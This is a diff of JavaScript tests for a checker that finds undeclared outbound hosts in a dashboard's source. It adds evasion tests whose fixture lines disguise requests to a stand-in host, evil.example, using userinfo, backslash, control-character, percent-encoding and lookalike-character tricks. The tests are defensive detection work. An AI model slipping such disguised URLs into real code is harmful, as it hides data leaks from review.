@@ -31,6 +31,7 @@ const declared = (host, extra = {}) => ({
   readme: false,
   purpose: "test",
   seen_in: ["src/a.js"],
+  request_from: ["src/a.js"],
   ...extra,
 });
 
@@ -124,32 +125,42 @@ test("an ignore entry cannot exempt more than the host it names", () => {
   );
 });
 
-test("a declared host reached from an undeclared file is caught", () => {
-  // The check that closes the actual #100 shape. api.github.com is legitimately
-  // declared for the header star count, so re-adding the per-project call would
-  // pass a check that only asks "which hosts can we reach". The question that
-  // matters is also "from where".
+test("a request from a file that only had permission to MENTION the host is caught", () => {
+  // The exact bypass an independent QA pass demonstrated on the merged branch.
+  // ProjectUsagePanel legitimately contains "https://github.com/" as a prefix it
+  // strips off project_ref, so file-level seen_in listed it as declared — and
+  // re-adding <img src={`https://github.com/${repo}.png`}> to that very file,
+  // the original defect, passed the check built to prevent it.
   const root = fixture({
     files: {
-      "dashboard/src/Allowed.jsx": 'const u = "https://shared.example/ok";\n',
-      "dashboard/src/Sneaky.jsx": 'const u = `https://shared.example/${repo}`;\n',
+      "dashboard/src/Allowed.jsx": 'fetch("https://shared.example/ok");\n',
+      "dashboard/src/Mentions.jsx": [
+        'const ref = raw.replace("https://shared.example/", "");',
+        "const bad = <img src={`https://shared.example/${repo}.png`} />;",
+        "",
+      ].join("\n"),
     },
-    hosts: [declared("shared.example", { seen_in: ["dashboard/src/Allowed.jsx"] })],
+    hosts: [
+      declared("shared.example", {
+        seen_in: ["dashboard/src/Allowed.jsx", "dashboard/src/Mentions.jsx"],
+        request_from: ["dashboard/src/Allowed.jsx"],
+      }),
+    ],
   });
   const findings = checkOutbound({ root });
-  assert.equal(findings.length, 1);
-  assert.match(findings[0], /Sneaky\.jsx, which is not in its seen_in list/);
+  assert.equal(findings.length, 1, JSON.stringify(findings));
+  assert.match(findings[0], /Mentions\.jsx:2 requests 'shared\.example'/);
 });
 
-test("seen_in is enforced, so it cannot drift into decoration", () => {
+test("request_from is enforced, so it cannot drift into decoration", () => {
   // Every seen_in list in the committed inventory is exact. They were
   // hand-written first and were wrong in six entries; the repo test above is
   // what surfaced that, and this one states the expectation directly.
   const root = fixture({
     files: { "src/a.js": 'const u = "https://x.example/1";\n' },
-    hosts: [declared("x.example", { seen_in: ["src/nonexistent.js"] })],
+    hosts: [declared("x.example", { request_from: [] })],
   });
-  assert.ok(checkOutbound({ root }).some((f) => f.includes("not in its seen_in list")));
+  assert.ok(checkOutbound({ root }).some((f) => f.includes("not in its request_from list")));
 });
 
 // --- Half B ------------------------------------------------------------------
@@ -165,7 +176,7 @@ test("a runtime-built fetch target is caught where the file can reach outside", 
         "",
       ].join("\n"),
     },
-    hosts: [declared("exfil.example", { seen_in: ["dashboard/src/Bad.jsx"] })],
+    hosts: [declared("exfil.example", { seen_in: ["dashboard/src/Bad.jsx"], request_from: ["dashboard/src/Bad.jsx"] })],
   });
   const findings = checkOutbound({ root });
   assert.ok(
@@ -188,4 +199,284 @@ test("a runtime-built fetch is left alone when the file names no external host",
     },
   });
   assert.deepEqual(checkOutbound({ root }), []);
+});
+
+test("a host built by interpolation is resolved to its literal suffix", () => {
+  // `img.src = `http://${token}-${i}.d.ip.net.coffee/pixel.gif`` is a real
+  // browser request in IpCheckPage. A strict [a-zA-Z0-9._-]+ host pattern matches
+  // nothing there, so that destination was invisible to the check that most
+  // needed to see it — and the inventory described the host as server-only.
+  const root = fixture({
+    files: {
+      "dashboard/src/Probe.jsx": "img.src = `http://${token}-${i}.probe.example/p.gif`;\n",
+    },
+  });
+  assert.ok(
+    checkOutbound({ root }).some((f) => f.includes("undeclared outbound host 'probe.example'")),
+    "the literal suffix of an interpolated host must be reported",
+  );
+});
+
+test("an unresolvable interpolated host is not invented", () => {
+  // `http://${req.headers.host || "localhost"}` ends the match mid-expression.
+  // Guessing from the remainder reports `req.headers.host` as a destination,
+  // which is noise that trains people to ignore the check.
+  const root = fixture({
+    files: { "src/serve.js": 'const u = new URL(p, `http://${req.headers.host || "localhost"}`);\n' },
+  });
+  assert.deepEqual(checkOutbound({ root }), []);
+});
+
+test("a comment is a mention; a clickable link needs link_from", () => {
+  // Comments are recognised positionally. Links are NOT guessed at: real ones
+  // appear as <a> split across lines, as named constants used later, and as props
+  // threaded through components, and every heuristic for those is a guess whose
+  // wrong answer exempts a real request. Declaring them is a visible diff.
+  const root = fixture({
+    files: {
+      "dashboard/src/Doc.jsx": [
+        "// See https://docs.example/guide for the format.",
+        'const link = <a href="https://docs.example/guide">docs</a>;',
+        "",
+      ].join("\n"),
+    },
+    hosts: [
+      declared("docs.example", {
+        seen_in: ["dashboard/src/Doc.jsx"],
+        request_from: [],
+        link_from: ["dashboard/src/Doc.jsx"],
+      }),
+    ],
+  });
+  assert.deepEqual(checkOutbound({ root }), []);
+});
+
+// --- Evasion ------------------------------------------------------------------
+// Written after adversarially attacking the check rather than only testing that
+// it works. Three of these were live holes in the first cut of the sink model.
+
+const shared = (extra = {}) => ({
+  host: "shared.example",
+  from: "browser",
+  user_data: false,
+  readme: true,
+  purpose: "test",
+  seen_in: ["dashboard/src/Ok.jsx", "dashboard/src/A.jsx"],
+  request_from: ["dashboard/src/Ok.jsx"],
+  link_from: [],
+  ...extra,
+});
+
+function attack(source, hosts = [shared()]) {
+  return checkOutbound({
+    root: fixture({
+      files: {
+        "dashboard/src/Ok.jsx": 'fetch("https://shared.example/ok");\n',
+        "dashboard/src/A.jsx": `${source}\n`,
+      },
+      hosts,
+      readme: "shared.example evil.example",
+    }),
+  });
+}
+
+test("userinfo cannot disguise the real host as a permitted one", () => {
+  // In `https://shared.example@evil.example/p.png` the browser goes to
+  // evil.example; the part that looks permitted is attacker-chosen decoration.
+  // Reading the left side reports a permitted host; refusing to parse hides the
+  // request entirely. Both are wrong.
+  const findings = attack('const x = <img src="https://shared.example@evil.example/p.png" />;');
+  assert.ok(
+    findings.some((f) => f.includes("evil.example")),
+    `expected evil.example to be reported, got: ${JSON.stringify(findings)}`,
+  );
+});
+
+test("a protocol-relative URL is a request", () => {
+  // `//evil.example/p.png` inherits the page scheme and carries no scheme for a
+  // https?:// pattern to match, so it was invisible.
+  assert.ok(attack('const x = <img src="//evil.example/p.png" />;').some((f) => f.includes("evil.example")));
+});
+
+test("string surgery elsewhere on the line does not exempt a request", () => {
+  // The mention test used to apply to the whole LINE, so putting the request
+  // beside an unrelated `.includes(` or `.replace(` silenced it — a one-character
+  // bypass of the check built to stop exactly this request.
+  for (const source of [
+    'if (k.includes("x")) el.innerHTML = `<img src="https://shared.example/${r}.png">`;',
+    'const s = `<img src="https://shared.example/${r}.png">`.replace("a", "b");',
+  ]) {
+    assert.ok(
+      attack(source).some((f) => f.includes("A.jsx") && f.includes("requests")),
+      `not caught: ${source}`,
+    );
+  }
+});
+
+test("a URL that IS the argument of a string operation stays a mention", () => {
+  // The counterpart. `raw.replace("https://shared.example/", "")` strips a prefix
+  // off a stored value; flagging it would train people to ignore the check.
+  assert.deepEqual(attack('const ref = raw.replace("https://shared.example/", "");'), []);
+});
+
+test("link_from covers a host the user clicks, and only where declared", () => {
+  const asLink = shared({ link_from: ["dashboard/src/A.jsx"] });
+  assert.deepEqual(attack('const RELEASES = "https://shared.example/releases/latest";', [asLink]), []);
+  // The same file without the declaration is a request.
+  assert.ok(attack('const RELEASES = "https://shared.example/releases/latest";').length > 0);
+});
+
+test("a backslash ends the authority, so userinfo cannot borrow a permitted name", () => {
+  // WHATWG URL parsing treats `\` as `/`, so `https://evil.example\@github.com/p.png`
+  // reaches evil.example and the rest is decoration. Splitting on "/" alone
+  // resolved it to `github.com` — a DECLARED host. That is worse than a miss:
+  // where the file has permission for github.com, the check reads green while
+  // the request leaves for somewhere else. This repo already made the same
+  // backslash assumption in the Host-header guard (issue 88).
+  const permitted = shared({ request_from: ["dashboard/src/A.jsx"] });
+  const findings = attack('const x = <img src="https://evil.example\\@shared.example/p.png" />;', [permitted]);
+  assert.ok(
+    findings.some((f) => f.includes("evil.example")),
+    `the real host must be reported, got: ${JSON.stringify(findings)}`,
+  );
+  // Scoped to the line under test: the fixture's other file legitimately
+  // produces its own shared.example finding, which says nothing about parsing.
+  assert.ok(
+    !findings.some((f) => f.includes("A.jsx") && f.includes("'shared.example'")),
+    "the borrowed name must not be what this line resolves to",
+  );
+});
+
+test("a trailing dot does not hide a host", () => {
+  // `other.example.` is a valid absolute FQDN that resolves identically. The
+  // hostname shape test rejected the dot and returned null, so the request was
+  // invisible rather than reported.
+  assert.ok(attack('const x = <img src="https://other.example./p.png" />;').some((f) => f.includes("other.example")));
+});
+
+// --- Parser-level borrows -----------------------------------------------------
+// The scanner reads SOURCE TEXT; the runtime reads the DECODED string, and WHATWG
+// URL parsing then removes tab/LF/CR. Every hole this control has had shares that
+// root cause, so each shape gets a test rather than a note.
+
+test("an escaped control character cannot splice a permitted host", () => {
+  // `fetch("https://api.github.com\\t.evil.example/x")` is
+  // api.github.com.evil.example at runtime — verify with
+  //   node -e 'console.log(new URL("https://a.example\\t.evil.example/").host)'
+  // Reading the source text and splitting on the backslash gave `api.github.com`:
+  // declared AND permitted, so the check read green while the request left for
+  // the attacker. Worse than a miss.
+  for (const escape of ["\\t", "\\u0009", "\\x09"]) {
+    const findings = attack(`fetch("https://shared.example${escape}.evil.example/x");`, [
+      shared({ request_from: ["dashboard/src/A.jsx"] }),
+    ]);
+    assert.ok(
+      findings.some((f) => f.includes("shared.example.evil.example")),
+      `${escape} spliced host not resolved: ${JSON.stringify(findings)}`,
+    );
+  }
+});
+
+test("a scheme with no slashes is still a request", () => {
+  // The IP-check page sends WebRTC STUN binding requests to Google and
+  // Cloudflare, disclosing the user's IP. `stun:` carries no `//` and appears in
+  // no https literal, so a scheme-anchored http(s) pattern could not see it —
+  // while the README certified "these hosts and no others".
+  assert.ok(
+    attack('const ice = [{ urls: "stun:stun.evil.example:19302" }];').some((f) =>
+      f.includes("stun.evil.example"),
+    ),
+  );
+});
+
+test("the scheme match is case-insensitive but does not fire inside another token", () => {
+  assert.ok(attack('const x = <img src="HTTPS://evil.example/p.png" />;').some((f) => f.includes("evil.example")));
+  // `arn:aws:bedrock:...` contains `ws:` and was reported as a host called
+  // `bedrock` — the noise that gets a check switched off.
+  assert.deepEqual(attack('const arn = "arn:aws:bedrock:us-east-1:1:foundation-model/x";'), []);
+});
+
+test("an interpolated suffix pins only a real zone, never a bare TLD", () => {
+  // `${sub}github.com` can resolve to the registrable `evilgithub.com`, so no pin.
+  // `${src}.ai` pins nothing either — `ai` is the TLD itself, and a comment
+  // illustrating a bad URL should not be reported as a destination.
+  assert.deepEqual(attack('const u = `https://${sub}shared.example/x`;'), []);
+  assert.deepEqual(attack("// fabricating `https://${src}.ai` resolves to unrelated domains"), []);
+  // A boundary that IS a zone still pins.
+  assert.ok(
+    attack("img.src = `http://${token}-${i}.probe.evil.example/p.gif`;").some((f) =>
+      f.includes("probe.evil.example"),
+    ),
+  );
+});
+
+test("data_from covers a host stored as a value and never fetched", () => {
+  // A mock fixture's `project_ref` is neither a link nor a request. Without its
+  // own category it lands on `link_from`, which is an UNCONDITIONAL waiver: once
+  // a file is there, any future request to that host from it passes forever.
+  const asData = shared({ data_from: ["dashboard/src/A.jsx"] });
+  assert.deepEqual(attack('const row = { project_ref: `https://shared.example/${repo}` };', [asData]), []);
+});
+
+test("percent-encoding in the authority cannot borrow a permitted host", () => {
+  // `https://shared.example%2eevil.example/x` resolves to
+  // shared.example.evil.example — a decoded dot is a valid host character:
+  //   node -e 'console.log(new URL("https://a.example%2eevil.example/").host)'
+  // The hostname shape test rejected the `%` and returned null, so the request
+  // was silently green. Same source-text-versus-decoded-string root cause as the
+  // escape splice, one encoding layer further out.
+  const permitted = shared({ request_from: ["dashboard/src/A.jsx"] });
+  const findings = attack('fetch("https://shared.example%2eevil.example/x");', [permitted]);
+  assert.ok(
+    findings.some((f) => f.includes("shared.example.evil.example")),
+    `percent-decoded host not resolved: ${JSON.stringify(findings)}`,
+  );
+});
+
+test("a lookalike character cannot be stripped into a permitted host", () => {
+  // `https://аapi.github.com` — the first `а` is Cyrillic. The runtime punycodes
+  // it to xn--api-5cd.github.com; a `[^a-zA-Z0-9]` strip quietly removed it and
+  // resolved to `api.github.com`, declared AND permitted. Green while it leaks.
+  //
+  // Six hand-rolled parsing rounds failed the same way, so host resolution now
+  // defers to `new URL()` — the parser the runtime itself uses.
+  const permitted = shared({ request_from: ["dashboard/src/A.jsx"] });
+  const findings = attack('fetch("https://аshared.example/x");', [permitted]);
+  assert.ok(
+    findings.some((f) => f.includes("xn--")),
+    `punycode host not reported: ${JSON.stringify(findings)}`,
+  );
+});
+
+test("an ideographic full stop is a label separator", () => {
+  // U+3002 is normalised to "." by WHATWG, so `shared.example。evil.example`
+  // resolves to shared.example.evil.example.
+  const permitted = shared({ request_from: ["dashboard/src/A.jsx"] });
+  assert.ok(
+    attack('fetch("https://shared.example。evil.example/x");', [permitted]).some((f) =>
+      f.includes("evil.example"),
+    ),
+  );
+});
+
+test("interpolation in the path leaves the host literal", () => {
+  // `https://evil.example/${owner}.png` has a resolvable authority. Testing the
+  // whole string for `${` sent every such URL down the pin path, where it
+  // resolved to nothing — a silent miss on the commonest shape there is.
+  assert.ok(
+    attack("const x = <img src={`https://evil.example/${owner}.png`} />;").some((f) =>
+      f.includes("evil.example"),
+    ),
+  );
+});
+
+test("a regex literal stripping a URL prefix is not a destination", () => {
+  // `repoInput.replace(/^https:\/\/github\.com\//, "")` is string surgery on user
+  // input. The `/^` between `replace(` and the URL hid that, and the escaped
+  // slashes then resolved to a bare `github` — a demand to declare a host that
+  // does not exist.
+  assert.deepEqual(
+    attack('const raw = repoInput.trim().replace(/^https:\\/\\/shared\\.example\\//, "");'),
+    [],
+  );
 });
